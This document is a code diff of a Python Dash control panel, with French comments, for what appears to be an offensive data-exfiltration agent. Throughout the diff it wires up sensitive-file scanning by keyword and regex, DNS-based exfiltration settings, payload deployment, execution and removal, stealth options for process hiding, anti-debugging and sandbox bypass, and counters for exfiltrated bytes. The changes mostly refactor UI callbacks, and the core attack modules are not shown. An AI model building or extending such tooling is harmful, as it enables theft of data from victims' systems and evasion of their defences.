+    no_clean_val = no_clean_val_str_h.split(',') if no_clean_val_str_h else []
+    no_anti_evasion_val = no_anti_evasion_val_str_h.split(',') if no_anti_evasion_val_str_h else []
+    stealth_hide_process_val = stealth_hide_process_val_str_h.split(',') if stealth_hide_process_val_str_h else []
+    stealth_anti_debug_val = stealth_anti_debug_val_str_h.split(',') if stealth_anti_debug_val_str_h else []
+    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str_h.split(',') if stealth_sandbox_bypass_val_str_h else []
 
 
     config_to_save = {
-        "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
-        "default_file_types": file_types, "default_exclude_types": exclude_types,
-        "default_min_size": min_size, "default_max_size": max_size,
-        "default_dns_server": dns_server, "default_dns_domain": dns_domain,
-        "default_keywords": keywords, "default_regex_patterns": regex_patterns,
-        "default_payload_url": payload_url, "default_payload_path": payload_path,
-        "default_threads": threads,
+        "aes_key": aes_key_h, "default_target_url": target_url_h, "default_scan_path": scan_path_h,
+        "default_file_types": file_types_h, "default_exclude_types": exclude_types_h,
+        "default_min_size": min_size_h, "default_max_size": max_size_h,
+        "default_dns_server": dns_server_h, "default_dns_domain": dns_domain_h,
+        "default_keywords": keywords_h, "default_regex_patterns": regex_patterns_h,
+        "default_payload_url": payload_url_h, "default_payload_path": payload_path_h,
+        "default_threads": threads_h,
         "default_debug_mode": debug_mode_val,
         "default_no_clean": no_clean_val,
         "default_no_anti_evasion": no_anti_evasion_val,
-        "default_explorer_target_host": explorer_target_host,
-        "default_explorer_base_path": explorer_base_path,
-        "default_explorer_depth": explorer_max_depth, # Use explorer_max_depth here
-        "default_exfil_method": exfil_method,
+        "default_explorer_target_host": explorer_target_host_h,
+        "default_explorer_base_path": explorer_base_path_h,
+        "default_explorer_depth": explorer_max_depth_h,
+        "default_exfil_method": exfil_method_h,
         "default_stealth_hide_process": stealth_hide_process_val,
         "default_stealth_anti_debug": stealth_anti_debug_val,
         "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
@@ -1371,8 +1470,7 @@ def save_config_final(n_clicks,
 
 
 @app.callback(
-    # FIX: L'Output 'command-output' est renommé 'live-log-stream-display-buffer'
-    Output('live-log-stream-display-buffer', 'children', allow_duplicate=True), # L'output global doit être un élément caché
+    Output('live-log-stream-display-buffer', 'children', allow_duplicate=True),
     Output('agent-stats-store', 'data', allow_duplicate=True),
     Input('launch-button', 'n_clicks'),
     State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
@@ -1380,7 +1478,9 @@ def save_config_final(n_clicks,
     State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
     State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
     State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
-    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
+    State('debug-mode-hidden', 'value'),
+    State('no-clean-hidden', 'value'),
+    State('no-anti-evasion-hidden', 'value'),
     State('agent-stats-store', 'data'),
     State('stealth-hide-process-hidden', 'value'),
     State('stealth-anti-debug-hidden', 'value'),
@@ -1415,13 +1515,13 @@ def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_ser
     if payload_path: command.extend(["--payload-path", payload_path])
     if threads: command.extend(["--threads", str(threads)])
 
-    debug_mode_list = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
-    no_clean_list = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
-    no_anti_evasion_list = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
-    
-    stealth_hide_process_list = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
-    stealth_anti_debug_list = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
-    stealth_sandbox_bypass_list = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str
+    # Convertir les valeurs STRING des hidden inputs en LISTES pour la logique du sous-processus
+    debug_mode_list = debug_mode_val_str.split(',') if debug_mode_val_str else []
+    no_clean_list = no_clean_val_str.split(',') if no_clean_val_str else []
+    no_anti_evasion_list = no_anti_evasion_val_str.split(',') if no_anti_evasion_val_str else []
+    stealth_hide_process_list = stealth_hide_process_val_str.split(',') if stealth_hide_process_val_str else []
+    stealth_anti_debug_list = stealth_anti_debug_val_str.split(',') if stealth_anti_debug_val_str else []
+    stealth_sandbox_bypass_list = stealth_sandbox_bypass_val_str.split(',') if stealth_sandbox_bypass_val_str else []
 
 
     if 'debug' in debug_mode_list: command.append("--debug")
@@ -1460,7 +1560,6 @@ def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_ser
         current_stats['exfil_failed_count'] = 0
         current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        # Le retour pour l'Output doit être l'élément PRE, pas seulement le string de message
         return html.Pre(status_message, style=CYBER_STATUS_BOX_STYLE), current_stats
 
     except FileNotFoundError:
@@ -1618,9 +1717,8 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
     trigger_id = ctx.triggered[0]['prop_id']
 
     if 'launch-explorer-button' in trigger_id:
-        # Nettoyer les logs de l'explorateur au début d'une nouvelle exploration
-        if global_log_streamer: global_log_streamer.clear_logs() # Ceci affecte tous les logs passés
-        explorer_log_states['file_explorer']['logs'] = [] # Réinitialise le buffer local
+        if global_log_streamer: global_log_streamer.clear_logs()
+        explorer_log_states['file_explorer']['logs'] = [] # Clear explorer specific logs
         explorer_log_states['file_explorer']['last_index'] = 0
 
         _GLOBAL_MODULE_LOGGER.log_info("Démarrage de l'exploration via l'interface.")
@@ -1641,11 +1739,12 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
         global_web_explorer.reset_state()
 
         is_web_exploration = False
-        # Logique pour déterminer si c'est une exploration web
+        # Détermine si c'est une exploration web (URL commençant par http/https ou un domaine sans base_path)
         if target_host and (target_host.startswith("http://") or target_host.startswith("https://") or
-                           (re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_host) and not base_path) or
-                           (re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_host) and '/' not in target_host and not base_path)):
+                           (re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_host) and not base_path) or # IP sans base path est web
+                           (re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_host) and '/' not in target_host and not base_path)): # Domaine sans base path est web
             is_web_exploration = True
+            # Normalisation pour s'assurer que target_host est une URL complète pour WebExplorer
             if not target_host.startswith("http"):
                 target_host = "http://" + target_host
 
@@ -1656,15 +1755,19 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
         try:
             if is_web_exploration:
                 target_url_for_web = target_host
-                if base_path:
+                if base_path: # Si base_path est fourni pour une URL web, on le joint
                     from urllib.parse import urljoin
                     target_url_for_web = urljoin(target_host, base_path.lstrip('/'))
 
                 status_message = html.Pre(f"INITIATING WEB EXPLORATION OF '{target_url_for_web}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                 _GLOBAL_MODULE_LOGGER.log_info(f"Initiating web exploration of '{target_url_for_web}' (Depth: {max_depth})...")
-                found_targets = global_web_explorer.explore_url(target_url_for_web, max_depth)
+                
+                # Appel de la nouvelle méthode d'entrée pour l'exploration récursive du WebExplorer
+                global_web_explorer.explore_url(target_url_for_web, max_depth) # Utilise la méthode explore_url corrigée
+                found_targets = global_web_explorer.get_found_targets()
 
-            else:
+
+            else: # Exploration locale (file_explorer)
                 if not base_path:
                      _GLOBAL_MODULE_LOGGER.log_error("For local exploration, a BASE PATH is required.")
                      return html.Pre("ERROR: For local exploration, a BASE PATH is required.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."
@@ -1677,6 +1780,7 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
                 _GLOBAL_MODULE_LOGGER.log_info(f"Initiating local file exploration of '{base_path}' (Depth: {max_depth})...")
                 found_targets = global_file_explorer.explore_path(base_path, max_depth)
 
+
             if not found_targets:
                 final_status = html.Pre(f"EXPLORATION COMPLETE. NO SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_WARNING)
             else:
@@ -1684,17 +1788,33 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
             _GLOBAL_MODULE_LOGGER.log_info(final_status.children)
 
             table_data = []
-            file_type_enum = OriginalFileExplorer.TARGET_TYPE_FILE if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_FILE
-            dir_type_enum = OriginalFileExplorer.TARGET_TYPE_DIRECTORY if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_DIRECTORY
+            # Définir les types selon le module qui a été utilisé
+            # Utilise les attributs de la classe Mock (pour la cohérence avec les anciens ID si les modules réels sont absents)
+            file_type_enum = OriginalFileExplorer.TARGET_TYPE_FILE
+            dir_type_enum = OriginalFileExplorer.TARGET_TYPE_DIRECTORY
+            # Types spécifiques à WebExplorer
+            web_content_type_enum = OriginalWebExplorer.TARGET_TYPE_CONTENT
+            web_api_type_enum = OriginalWebExplorer.TARGET_TYPE_API
+            web_vuln_type_enum = OriginalWebExplorer.TARGET_TYPE_VULN
+            web_sitemap_type_enum = OriginalWebExplorer.TARGET_TYPE_SITEMAP_ENTRY
+            web_form_type_enum = OriginalWebExplorer.TARGET_TYPE_FORM
+
 
             for i, item in enumerate(found_targets):
                 actions_html_children = []
 
                 is_actionable_file = False
-                if item['type'] == file_type_enum:
-                    is_actionable_file = True
+                can_read_url_content = False
 
-                if is_actionable_file:
+                if item['type'] == file_type_enum: # C'est un fichier local
+                    is_actionable_file = True
+                elif item['type'] == OriginalWebExplorer.TARGET_TYPE_FILE: # C'est un fichier web
+                    is_actionable_file = True
+                    can_read_url_content = True # Les fichiers web peuvent aussi être lus via l'URL
+                elif is_web_exploration and item['type'] in [dir_type_enum, web_api_type_enum, web_vuln_type_enum, web_sitemap_type_enum, web_form_type_enum]:
+                    can_read_url_content = True # Répertoires, APIs, Vuln, Sitemap, Formulaires peuvent être "lus" (leur URL affichée)
+
+                if is_actionable_file: # S'il s'agit d'un fichier identifiable et téléchargeable
                     read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})
                     download_button_id = json.dumps({'type': 'download-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})
 
@@ -1704,16 +1824,34 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
                     actions_html_children.append(
                         html.Button('DOWNLOAD', id=download_button_id, n_clicks=0, style=CYBER_DOWNLOAD_BUTTON_TABLE_STYLE)
                     )
-                elif item['type'] == dir_type_enum:
+                elif can_read_url_content: # Si c'est une URL cliquable/lisible mais pas forcément un fichier téléchargeable
+                    read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'web'})
                     actions_html_children.append(
-                        html.Span("DIR", style={'color': '#FF00FF', 'fontWeight': 'bold'})
+                        html.Button('READ URL', id=read_button_id, n_clicks=0, style=CYBER_ACTION_BUTTON_TABLE_STYLE)
                     )
+                
+                # Libellés spécifiques pour les types non-fichier/répertoire
+                if item['type'] == dir_type_enum:
+                    actions_html_children.append(html.Span("DIR", style={'color': '#FF00FF', 'fontWeight': 'bold'}))
+                elif item['type'] == web_content_type_enum:
+                    actions_html_children.append(html.Span("CONTENT", style={'color': '#FFAA00', 'fontWeight': 'bold'}))
+                elif item['type'] == web_api_type_enum:
+                    actions_html_children.append(html.Span("API", style={'color': '#00EEFF', 'fontWeight': 'bold'}))
+                elif item['type'] == web_vuln_type_enum:
+                    actions_html_children.append(html.Span("VULN", style={'color': '#FF0000', 'fontWeight': 'bold'}))
+                elif item['type'] == web_sitemap_type_enum:
+                    actions_html_children.append(html.Span("SITEMAP", style={'color': '#CCAAFF', 'fontWeight': 'bold'}))
+                elif item['type'] == web_form_type_enum:
+                    actions_html_children.append(html.Span("FORM", style={'color': '#00FF00', 'fontWeight': 'bold'}))
+
 
                 table_data.append({
                     "path": item['path'],
-                    "full_path": item['full_path'],
+                    "full_path": item['full_path'], # Ajout pour faciliter la lecture/téléchargement
                     "type": item['type'],
                     "sensitive_match": item['sensitive_match'],
+                    "content_type": item.get('content_type', 'N/A'), # Affiche le content-type si disponible
+                    "source": item.get('source', 'Unknown'), # Affiche la source de détection
                     "actions": html.Div(actions_html_children).to_plotly_json()
                 })
 
@@ -1732,15 +1870,15 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
 
         if clicked_index is not None and clicked_index < len(table_data):
             file_item = table_data[clicked_index]
-            file_full_path = file_item.get('full_path')
+            target_path = file_item.get('full_path') # full_path contient l'URL ou le chemin local
 
-            if file_full_path:
+            if target_path:
                 content = ""
                 try:
                     if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
-                        content = global_file_explorer.read_file_content(file_full_path)
+                        content = global_file_explorer.read_file_content(target_path)
                     elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
-                        content = global_web_explorer.read_file_content_from_url(file_full_path)
+                        content = global_web_explorer.read_file_content_from_url(target_path)
                     else:
                         _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode.")
                         return dash.no_update, dash.no_update, html.Pre("ERROR: Explorer not available for this source type or in mock mode.", style=CYBER_STATUS_ERROR)
@@ -1748,11 +1886,11 @@ def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, ba
                     _GLOBAL_MODULE_LOGGER.log_info(f"Reading content of '{file_item['path']}'.")
                     return dash.no_update, dash.no_update, html.Pre(f"CONTENT OF '{file_item['path']}':\n\n{content}", style=CYBER_STATUS_WARNING)
                 except Exception as e:
-                    _GLOBAL_MODULE_LOGGER.log_error(f"Error reading file content '{file_full_path}': {e}")
+                    _GLOBAL_MODULE_LOGGER.log_error(f"Error reading file content '{target_path}': {e}")
                     return dash.no_update, dash.no_update, html.Pre(f"ERROR READING FILE CONTENT: {e}", style=CYBER_STATUS_ERROR)
 
-            _GLOBAL_MODULE_LOGGER.log_error("FILE PATH NOT FOUND IN TABLE DATA for read action.")
-            return dash.no_update, dash.no_update, html.Pre("FILE PATH NOT FOUND IN TABLE DATA.", style=CYBER_STATUS_ERROR)
+            _GLOBAL_MODULE_LOGGER.log_error("TARGET PATH NOT FOUND IN TABLE DATA for read action.")
+            return dash.no_update, dash.no_update, html.Pre("TARGET PATH NOT FOUND IN TABLE DATA.", style=CYBER_STATUS_ERROR)
         return dash.no_update, dash.no_update, dash.no_update
 
 
@@ -1768,8 +1906,8 @@ def stop_explorer(n_clicks):
         _GLOBAL_MODULE_LOGGER.log_info("Arrêt de l'exploration demandé par l'utilisateur.")
         global_file_explorer.reset_state()
         global_web_explorer.reset_state()
-        if global_log_streamer: global_log_streamer.clear_logs() # Ceci affecte tous les logs passés
-        explorer_log_states['file_explorer']['logs'] = [] # Réinitialise le buffer local
+        if global_log_streamer: global_log_streamer.clear_logs()
+        explorer_log_states['file_explorer']['logs'] = []
         explorer_log_states['file_explorer']['last_index'] = 0
 
         return (
@@ -1800,17 +1938,20 @@ def download_file(download_n_clicks_list, table_data):
 
     if clicked_index is not None and clicked_index < len(table_data):
         file_item = table_data[clicked_index]
-        file_full_path = file_item.get('full_path')
+        target_path = file_item.get('full_path')
 
-        if file_full_path:
+        if target_path:
             file_content_base64 = ""
             filename = os.path.basename(file_item['path'])
+            if not filename or filename == '':
+                filename = f"downloaded_file_{datetime.now().strftime('%Y%m%d%H%M%S')}"
+
 
             try:
                 if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
-                    file_content_base64 = global_file_explorer.download_file_base64(file_full_path)
+                    file_content_base64 = global_file_explorer.download_file_base64(target_path)
                 elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
-                    file_content_base64 = global_web_explorer.download_file_base64_from_url(file_full_path)
+                    file_content_base64 = global_web_explorer.download_file_base64_from_url(target_path)
                 else:
                     _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode for download.")
                     raise dash.exceptions.PreventUpdate
@@ -1818,71 +1959,151 @@ def download_file(download_n_clicks_list, table_data):
                 if file_content_base64 and not file_content_base64.startswith("[ERROR]"):
                     decoded_content = base64.b64decode(file_content_base64.encode('utf-8'))
                     _GLOBAL_MODULE_LOGGER.log_info(f"Downloading '{file_item['path']}'.")
-                    return dcc.send_bytes(decoded_content, filename)
+                    mime_type, _ = mimetypes.guess_type(filename)
+                    if mime_type is None: mime_type = 'application/octet-stream'
+                    
+                    return dcc.send_bytes(decoded_content, filename, type=mime_type)
                 else:
-                    _GLOBAL_MODULE_LOGGER.log_error(f"Failed to get file content (Base64) for '{file_full_path}': {file_content_base64}")
+                    _GLOBAL_MODULE_LOGGER.log_error(f"Failed to get file content (Base64) for '{target_path}': {file_content_base64}")
                     raise dash.exceptions.PreventUpdate
             except Exception as e:
-                _GLOBAL_MODULE_LOGGER.log_critical(f"Error during file download for '{file_full_path}': {e}")
+                _GLOBAL_MODULE_LOGGER.log_critical(f"Error during file download for '{target_path}': {e}")
                 raise dash.exceptions.PreventUpdate
     raise dash.exceptions.PreventUpdate
 
 
+# --- NOUVEAU CALLBACK : Mises à jour des buffers de logs (toujours dans le DOM) ---
 @app.callback(
-    # Met à jour le buffer caché des logs de l'explorateur
-    Output('_hidden_explorer_logs_buffer', 'children'), 
-    # Met à jour le buffer caché des logs du tableau de bord
-    Output('_hidden_dashboard_live_logs_buffer', 'children'), 
-    Output('explorer-log-last-index', 'data'), # Met à jour l'index des logs
+    [Output('live-log-stream-display-buffer', 'children'),
+     Output('_hidden_explorer_logs_buffer', 'children'),
+     Output('explorer-log-last-index', 'data')],
     [Input('interval-explorer-logs', 'n_intervals'),
      Input('interval-dashboard-refresh', 'n_intervals')],
-    State('explorer-log-last-index', 'data'),
-    prevent_initial_call=False
+    [State('explorer-log-last-index', 'data'),
+     State('live-log-stream-display-buffer', 'children'),
+     State('_hidden_explorer_logs_buffer', 'children')],
+    prevent_initial_call=True # Important : NE PAS déclencher au démarrage pour éviter les races conditions.
+                              # Seul le log_streamer_init_trigger s'occupe de la 1ère activation du streamer.
 )
-def refresh_all_live_logs(n_intervals_explorer, n_intervals_dashboard, current_log_indices):
-    if global_log_streamer is None:
-        error_msg = "Live logs not available (LogStreamer module missing)."
-        return error_msg, error_msg, current_log_indices
-        
-    new_logs, new_total_index = global_log_streamer.get_logs(current_log_indices['file'])
+def update_hidden_log_buffers(n_intervals_explorer, n_intervals_dashboard, current_log_indices, current_dashboard_buffer_content, current_explorer_buffer_content):
+    updated_dashboard_buffer_content_hidden = current_dashboard_buffer_content if current_dashboard_buffer_content is not None else ""
+    updated_explorer_buffer_content_hidden = current_explorer_buffer_content if current_explorer_buffer_content is not None else ""
+    updated_log_indices = current_log_indices.copy() # Copie pour modifications
 
-    if new_logs:
-        explorer_log_states['file_explorer']['logs'].extend(new_logs)
-        current_log_indices['file'] = new_total_index
+    # Mise à jour du buffer des logs du dashboard/agent principal
+    new_dashboard_logs, new_dashboard_total_index = global_log_streamer.get_logs(updated_log_indices.get('dashboard_stream', 0))
+    if new_dashboard_logs:
+        updated_dashboard_buffer_content_hidden += "\n" + "\n".join(new_dashboard_logs)
+        # Limiter la taille du buffer
+        lines = updated_dashboard_buffer_content_hidden.split('\n')
+        if len(lines) > 500: # Max 500 lignes pour les logs généraux
+            updated_dashboard_buffer_content_hidden = "\n".join(lines[-500:])
+        updated_log_indices['dashboard_stream'] = new_dashboard_total_index
     
-    all_logs_content = "\n".join(explorer_log_states['file_explorer']['logs'])
+    # Mise à jour du buffer des logs de l'explorateur (WebExplorer/FileExplorer)
+    new_explorer_logs, new_explorer_total_index = _GLOBAL_MODULE_LOGGER.get_new_logs(updated_log_indices.get('file_explorer', 0))
+    if new_explorer_logs:
+        updated_explorer_buffer_content_hidden += "\n" + "\n".join(new_explorer_logs)
+        # Limiter la taille du buffer
+        lines = updated_explorer_buffer_content_hidden.split('\n')
+        if len(lines) > 500: # Max 500 lignes pour les logs de l'explorateur
+            updated_explorer_buffer_content_hidden = "\n".join(lines[-500:])
+        updated_log_indices['file_explorer'] = new_explorer_total_index
 
-    return all_logs_content, all_logs_content, current_log_indices # Retourne le même contenu pour les deux buffers
+    return updated_dashboard_buffer_content_hidden, \
+           updated_explorer_buffer_content_hidden, \
+           updated_log_indices
+
+
+# --- NOUVEAUX CALLBACKS : Pousser les logs des buffers cachés vers l'UI visible ---
+# Ces callbacks se déclenchent LORSQUE LE CONTENU DU BUFFER CACHE CHANGE
+# ET UNIQUEMENT SI L'ONGLET CORRESPONDANT EST ACTIF.
+@app.callback(
+    Output('live-log-stream-display', 'children'),
+    Input('live-log-stream-display-buffer', 'children'), # Déclenché par le changement du buffer caché
+    State('cyber-tabs', 'value'), # État de l'onglet actif
+    prevent_initial_call=False # Doit être False pour que l'initialisation fonctionne
+)
+def update_live_log_stream_display(buffered_content, active_tab_id):
+    if active_tab_id == 'tab-logs-status':
+        return buffered_content
+    return dash.no_update
 
 @app.callback(
-    Output('agent-stats-store', 'data'),
+    Output('dashboard-live-logs_display', 'children'),
+    Input('live-log-stream-display-buffer', 'children'), # Déclenché par le changement du buffer caché
+    State('cyber-tabs', 'value'), # État de l'onglet actif
+    prevent_initial_call=False
+)
+def update_dashboard_live_logs_display(buffered_content, active_tab_id):
+    if active_tab_id == 'tab-dashboard':
+        return buffered_content
+    return dash.no_update
+
+@app.callback(
+    Output('explorer-logs-output_visible', 'children'),
+    Input('_hidden_explorer_logs_buffer', 'children'), # Déclenché par le changement du buffer caché de l'explorateur
+    State('cyber-tabs', 'value'), # État de l'onglet actif
+    prevent_initial_call=False
+)
+def update_explorer_logs_output_visible(buffered_content, active_tab_id):
+    if active_tab_id == 'tab-file-explorer':
+        return buffered_content
+    return dash.no_update
+
+
+@app.callback(
+    Output('agent-stats-store', 'data', allow_duplicate=True),
     [Input('interval-dashboard-refresh', 'n_intervals')],
     State('agent-stats-store', 'data'),
     prevent_initial_call=False
 )
 def update_dashboard_stats(n_intervals, current_stats):
-    if current_stats['agent_status'] == 'RUNNING' and global_log_streamer:
-        # Assurez-vous que global_log_streamer.get_logs() retourne une liste de logs et l'index total
-        # et que le premier élément est bien le contenu des logs
-        log_content = global_log_streamer.get_logs()[0]
-        files_scanned_count = sum(1 for line in log_content if "Scanning:" in line)
-        files_matched_count = sum(1 for line in log_content if "MATCH:" in line)
-        exfil_success_count = sum(1 for line in log_content if "Exfiltration SUCCESS" in line)
-        exfil_failed_count = sum(1 for line in log_content if "Exfiltration FAILED" in line)
+    # Les stats de l'agent ne sont pas gérées par LogStreamer, mais le WebExplorer a ses propres stats
+    # Cette fonction est appelée uniquement par interval-dashboard-refresh, donc elle ne s'exécute pas en permanence
+    if global_web_explorer: # S'assurer que le WebExplorer est bien importé/instancié
+        web_explorer_stats = global_web_explorer.get_exploration_stats()
+
+        # Met à jour les valeurs dans current_stats directement
+        current_stats['urls_visited'] = web_explorer_stats.get('urls_visited', 0)
+        current_stats['urls_queued'] = web_explorer_stats.get('urls_queued', 0)
+        current_stats['urls_skipped_external'] = web_explorer_stats.get('urls_skipped_external', 0)
+        current_stats['urls_skipped_visited'] = web_explorer_stats.get('urls_skipped_visited', 0)
+        current_stats['urls_skipped_robots'] = web_explorer_stats.get('urls_skipped_robots', 0)
+        current_stats['files_identified'] = web_explorer_stats.get('files_identified', 0)
+        current_stats['dirs_identified'] = web_explorer_stats.get('dirs_identified', 0)
+        current_stats['content_matches'] = web_explorer_stats.get('content_matches', 0)
+        current_stats['api_endpoints_identified'] = web_explorer_stats.get('api_endpoints_identified', 0)
+        current_stats['vuln_paths_identified'] = web_explorer_stats.get('vuln_paths_identified', 0)
+        current_stats['sitemap_entries_identified'] = web_explorer_stats.get('sitemap_entries_identified', 0)
+        current_stats['forms_identified'] = web_explorer_stats.get('forms_identified', 0)
+        current_stats['requests_successful'] = web_explorer_stats.get('requests_successful', 0)
+        current_stats['requests_failed'] = web_explorer_stats.get('requests_failed', 0)
+        current_stats['total_requests_made'] = web_explorer_stats.get('total_requests_made', 0)
+        current_stats['bytes_downloaded_html'] = web_explorer_stats.get('bytes_downloaded_html', 0)
+        current_stats['bytes_downloaded_files'] = web_explorer_stats.get('bytes_downloaded_files', 0)
+
+        # Calcul des totaux pour l'affichage principal des stats
+        current_stats['files_scanned'] = web_explorer_stats.get('urls_visited', 0)
+        current_stats['files_matched'] = web_explorer_stats['files_identified'] + \
+                                         web_explorer_stats['dirs_identified'] + \
+                                         web_explorer_stats['content_matches'] + \
+                                         web_explorer_stats['api_endpoints_identified'] + \
+                                         web_explorer_stats['vuln_paths_identified'] + \
+                                         web_explorer_stats['sitemap_entries_identified'] + \
+                                         web_explorer_stats['forms_identified']
         
-        data_exfiltrated_bytes = 0
-        for line in log_content:
-            match = re.search(r"Exfiltrated (\d+) bytes", line)
-            if match:
-                data_exfiltrated_bytes += int(match.group(1))
+        current_stats['data_exfiltrated_bytes'] = web_explorer_stats['bytes_downloaded_html'] + web_explorer_stats['bytes_downloaded_files']
+        current_stats['exfil_success_count'] = web_explorer_stats['requests_successful']
+        current_stats['exfil_failed_count'] = web_explorer_stats['requests_failed']
 
-        current_stats['files_scanned'] = files_scanned_count
-        current_stats['files_matched'] = files_matched_count
-        current_stats['exfil_success_count'] = exfil_success_count
-        current_stats['exfil_failed_count'] = exfil_failed_count
-        current_stats['data_exfiltrated_bytes'] = data_exfiltrated_bytes
-        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
+        # Mise à jour du statut pour qu'il soit plus dynamique
+        current_stats['agent_status'] = web_explorer_stats['last_status']
+        if web_explorer_stats['current_url'] != 'N/A':
+            current_stats['agent_last_activity'] = f"Last URL: {web_explorer_stats['current_url']}"
+        elif web_explorer_stats['start_time']:
+            current_stats['agent_last_activity'] = f"Running for {web_explorer_stats['duration_seconds']:.0f}s"
+        
     return current_stats
 
 
@@ -1973,7 +2194,7 @@ def request_system_info(n_clicks):
             system_data.get('disk_info', []),
             html.Pre(network_info_str, style=CYBER_STATUS_BOX_STYLE),
             system_data.get('users_info', []),
-            system_data.get('processes_info', []) # Correction ici
+            system_data.get('processes_info', [])
         )
 
     except Exception as e:
@@ -1994,12 +2215,11 @@ def request_system_info(n_clicks):
 
 @app.callback(
     Output('payload-status-output', 'children'),
-    # FIX: Ces Inputs doivent pointer vers les inputs cachés pour leurs valeurs
     Input('deploy-payload-button', 'n_clicks'),
     Input('execute-payload-button', 'n_clicks'),
     Input('remove-payload-button', 'n_clicks'),
-    State('payload-url-hidden', 'value'), # Utiliser la version cachée
-    State('payload-path-hidden', 'value'), # Utiliser la version cachée
+    State('payload-url-hidden', 'value'),
+    State('payload-path-hidden', 'value'),
     prevent_initial_call=True
 )
 def handle_payload_actions(deploy_n, execute_n, remove_n, payload_url, payload_path):
@@ -2036,14 +2256,16 @@ def apply_stealth_settings(n_clicks, hide_process_val_str, anti_debug_val_str, s
     if n_clicks == 0:
         raise dash.exceptions.PreventUpdate
 
-    hide_process = eval(hide_process_val_str) if isinstance(hide_process_val_str, str) else hide_process_val_str
-    anti_debug = eval(anti_debug_val_str) if isinstance(anti_debug_val_str, str) else anti_debug_val_str
-    sandbox_bypass = eval(sandbox_bypass_val_str) if isinstance(sandbox_bypass_val_str, str) else sandbox_bypass_val_str
+    # Les valeurs des checklists cachées sont des chaînes (comma-separated).
+    # Il faut les retransformer en listes pour la logique Python.
+    hide_process_list = hide_process_val_str.split(',') if hide_process_val_str else []
+    anti_debug_list = anti_debug_val_str.split(',') if anti_debug_val_str else []
+    sandbox_bypass_list = sandbox_bypass_val_str.split(',') if sandbox_bypass_val_str else []
 
     status = "Applying Stealth Settings:\n"
-    status += f"  - Hide Process: {'Enabled' if 'hide_process' in hide_process else 'Disabled'}\n"
-    status += f"  - Anti-Debugging: {'Enabled' if 'anti_debug' in anti_debug else 'Disabled'}\n"
-    status += f"  - Sandbox Bypass: {'Enabled' if 'sandbox_bypass' in sandbox_bypass else 'Disabled'}" 
+    status += f"  - Hide Process: {'Enabled' if 'hide_process' in hide_process_list else 'Disabled'}\n"
+    status += f"  - Anti-Debugging: {'Enabled' if 'anti_debug' in anti_debug_list else 'Disabled'}\n"
+    status += f"  - Sandbox Bypass: {'Enabled' if 'sandbox_bypass' in sandbox_bypass_list else 'Disabled'}"
 
     _GLOBAL_MODULE_LOGGER.log_info(status)
     
@@ -2052,13 +2274,12 @@ def apply_stealth_settings(n_clicks, hide_process_val_str, anti_debug_val_str, s
 # --- Activation retardée de LogStreamer via callback sur dcc.Store ---
 # Ce callback s'exécute une seule fois au chargement initial de l'application
 @app.callback(
-    Output('log-streamer-init-trigger', 'data'), # Un output bidon pour déclencher le callback
-    Input('log-streamer-init-trigger', 'data'), # L'input est la valeur initiale du Store (0)
-    prevent_initial_call=False # Ceci permet au callback de s'exécuter au chargement initial
+    Output('log-streamer-init-trigger', 'data'),
+    Input('log-streamer-init-trigger', 'data'),
+    prevent_initial_call=False
 )
 def initialize_log_streamer(data):
     global global_log_streamer
-    # Utiliser l'instance globale du sys pour la persistance entre les rechargements Dash
     if not hasattr(sys, '_log_streamer_active_flag'):
         sys._log_streamer_active_flag = False
 
